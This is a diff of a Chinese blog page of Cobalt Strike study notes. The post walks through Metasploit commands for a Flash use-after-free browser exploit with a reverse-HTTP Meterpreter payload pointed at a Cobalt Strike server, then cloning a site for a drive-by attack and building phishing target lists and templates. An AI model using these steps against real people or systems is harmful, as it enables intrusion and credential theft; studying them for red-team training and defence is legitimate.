@@ -459,6 +459,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -473,16 +476,20 @@
 <p>6、最后运行<code>exploit -j</code>，-j 是指作为job开始运行，即在后台运行。</p>
 <h1 id="0x01-操作"><a href="#0x01-操作" class="headerlink" title="0x01 操作"></a>0x01 操作</h1><h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><p>在CS中新建一个HTTP Beacon，创建过程不再赘述，具体操作过程可参见之前第5节的学习笔记。</p>
 <h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>1、在MSF中选择攻击模块，根据教程这里选择的<code>adobe_flash_hacking_team_uaf</code>模块，不过个人感觉现在这个模块已经不太能被利用成功了。</p>
-<pre><code>use exploit/multi/browser/adobe_flash_hacking_team_uaf</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;browser&#x2F;adobe_flash_hacking_team_uaf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>2、接着配置payload，这里选择revese_http payload</p>
-<pre><code>set payload windows/meterpreter/revese_http
+<pre class="line-numbers language-none"><code class="language-none">set payload windows&#x2F;meterpreter&#x2F;revese_http
 set LHOST cs_server_ip
-set LPORT 80</code></pre>
+set LPORT 80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>3、之后，配置<code>DisablePayloadHandler</code>、<code>PrependMigrate</code>为 True</p>
-<pre><code>set DisablePayloadHandler True
-set PrependMigrate True</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">set DisablePayloadHandler True
+set PrependMigrate True<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>4、最后，开始攻击。</p>
-<pre><code>exploit -j</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">exploit -j<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs9-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h2 id="伪装——克隆网站"><a href="#伪装——克隆网站" class="headerlink" title="伪装——克隆网站"></a>伪装——克隆网站</h2><p>在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。</p>
 <p>首先，来到<code>Attacks --&gt; Web Drive-by --&gt; Clone Site</code>下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。</p>
@@ -497,9 +504,10 @@ set PrependMigrate True</code></pre>
 <h2 id="目标清单"><a href="#目标清单" class="headerlink" title="目标清单"></a>目标清单</h2><p>目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。</p>
 <p>在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。</p>
 <p>这里使用一些在线邮件接收平台的邮箱地址作为示例。</p>
-<pre><code>astrqb79501@chacuo.net    test1
-gswtdm26180@chacuo.net    test2
-ypmgin95416@chacuo.net    test3</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">astrqb79501@chacuo.net	test1
+gswtdm26180@chacuo.net	test2
+ypmgin95416@chacuo.net	test3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>将以上内容保存为txt文本文件，就创建好了自己的目标清单。</p>
 <h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。</p>
 <p>首先可以自己写一封邮件发给自己，或者直接从自己收件箱挑选一个合适的。有了合适的邮件之后，查看邮件原始信息，一般在邮件的选项里能找到这个功能。最后将邮件的原始信息保存为文件，一个模板就制作完成了。</p>
@@ -944,7 +952,7 @@ ypmgin95416@chacuo.net    test3</code></pre>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">162.6k</span>&nbsp;字
+                class="white-color">164k</span>&nbsp;字
             
             
             
